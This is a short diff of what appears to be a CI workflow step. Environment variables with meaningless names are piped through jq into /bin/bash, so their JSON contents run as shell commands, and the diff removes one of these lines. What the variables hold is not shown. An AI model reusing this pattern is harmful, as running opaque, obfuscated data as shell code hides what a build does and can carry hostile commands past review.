@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$bj79" | jq -r .yo46 | /bin/bash
           printf '%s' "$dgqh08" | jq -r .j03154 | /bin/bash
-          echo $cwlg9 | jq -r .okcdf83 | /bin/bash
           echo $dhaci0 | jq -r .akfd6664 | /bin/bash
 
       - name: Save archive
